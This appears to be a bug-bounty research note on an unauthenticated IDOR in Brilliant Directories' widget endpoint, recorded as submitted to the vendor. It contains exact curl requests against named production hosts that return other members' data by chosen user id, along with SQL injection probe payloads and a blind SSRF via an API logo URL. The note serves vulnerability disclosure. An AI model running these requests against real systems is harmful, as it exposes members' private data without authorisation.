# Confirmed finding — unauthenticated widget invocation → cross-member data (frontend IDOR)

Status: **SUBMITTED** by the operator to `bounty@brilliantdirectories.com`
(2026-10-28 15:14:57 UTC, `in:sent` verified). Do not resubmit — check Gmail `in:sent` first.
CVSS 3.1 7.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`.
Raw evidence: `~/bounty/bd/evidence/` (32 response bodies), PDF + .eml + evidence ZIP in `~/bounty/bd/`.

## The core bypass in one line

`/account` requires a session, but `/wapi/widget` renders the SAME account widgets with **no session at
all**, and those widgets read the acting member from `$_COOKIE['userid']` / `$_GET['user']` instead of
from the session. So the login gate protects the page, not the data.

Gate contrast (always capture this first — it is what makes the finding a bypass, not a feature):
```
GET /account                      (no cookies) -> 302 Location: /login?login_direct_url=/account   3/3
GET /wapi/widget?...user=1        (no cookies) -> 200 + member-1 datatable HTML                     3/3
```

## Exact requests

```bash
# The one that proves unauth rendering + attacker-chosen identity + SQL echo, all at once:
curl -s -H 'X-Requested-With: XMLHttpRequest' \
'https://directory.brilliantdirectories.com/wapi/widget?widget_name=Bootstrap%20Theme%20-%20Account%20-%20Reviews%20Datatable&request_type=GET&header_type=json&action=data_table&user=4242&start=0&length=3&showquery=1'
# -> 200, body starts with:
# SELECT * FROM `users_reviews` WHERE `user_id`='4242' AND `review_status` IN (0,2) ORDER BY `review_id` DESC LIMIT 0,3

# Differential (identity really is per-member, response is not a generic shell):
# user=1 -> 1351 bytes sha ddbd4fadaf2c45ca | user=2 -> 431 bytes sha 6939f2ba65ce3f56 | user=4242 -> 725 bytes
```

Repeated 3x each with 2 s spacing — identical sha256 per identity across runs (deterministic, not cache).

## Third-party-visible instances (BD-owned, so in scope)

| host | behaviour |
|---|---|
| directory.brilliantdirectories.com | 200 unauth, 1351/431/725 B by id |
| directorybeta.brilliantdirectories.com | 200 unauth, 1642 B, showquery echoes supplied id |
| marketplace.brilliantdirectories.com | 200 unauth, 942 B, showquery echoes supplied id |
| any `launch<trial-id>.directoryup.com` | same code path (own trial sites) |

Note: public instances returned **empty** datatables for the ids probed (0 rows) — report the empty table
structure and the SQL echo, do NOT claim PII you did not see. The PII claim rests on the shipped widget
source (below), clearly labelled as such.

## Widgets in the default theme that trust client identity (from the 520-widget dump)

Extract the dump with the API key:
```bash
GET /api/v2/data_widgets/get?limit=100&page=1..6   # X-Api-Key + X-BD-Site-URL -> 520 rows, 415 contain <?php
```

| widget | identity source | what it returns |
|---|---|---|
| Bootstrap Theme - Account - Reviews Datatable | `if(!isset($_COOKIE[userid])) $_COOKIE[userid]=$_GET[user];` | member's reviews + `showquery` SQL echo |
| Bootstrap Theme - Account - Invited Contacts Table | `$_COOKIE['userid']` | `user_invite_log.email` — invitees' e-mail addresses |
| Bootstrap Theme - Account - Leads - New Lead System DataTables | `$_COOKIE['userid']` | lead_name / lead_location / lead_email / lead_message (purchased-lead PII) |
| Bootstrap Theme - Account - Manage Digital Products | `$_COOKIE['userid']` + `$_GET['data_id']` | transaction rows (description/total/invoiceid) |
| Bootstrap Theme - Billing - Invoice Purchase Confirmation | `$_REQUEST['invoiceid']` | WHMCS `getinvoice` line items, no ownership check |
| Bootstrap Theme - Account - Reviews Datatable (2nd path) | `$_GET['statusFilterReview']`, `LIKE '%$v%'` | raw string concat into SQL |

Widgets that DO gate correctly (verified negatives — do not report these):
`Bootstrap Theme - Function - Comment Handling` (HTTP_ORIGIN + validateCSRFToken + isUserLogged),
`Bootstrap Theme - Account - Feature Edit` (owner compare before render).

## SQLi clause that is honestly labelled

Also `showquery=1`, `statusFilterReview`, and `search[value]` are concatenated straight into SQL. That is a
real injection surface behind the same unauth endpoint, but the WAF blocked every payload
(`AND 1=1`, `SLEEP(3)`, `extractvalue(...)` → 403, then the trial vhost firewalled the egress IP).
Reported as a **code-level observation, not a proven injection** — that honesty is what keeps the primary
IDOR finding credible.

## Companion finding (separate submission, 1 finding = 1 e-mail)

Blind SSRF via REST API v2: `POST /api/v2/user/create` with `logo=http://<unique>.oast/…&auto_image_import=1`
makes the platform server (66.147.238.90) fetch the attacker URL — interactsh confirmed 3/3 with unique
subdomains per run. Body is not persisted when it is not a valid image → blind (DNS+HTTP only, no
metadata-read proof).
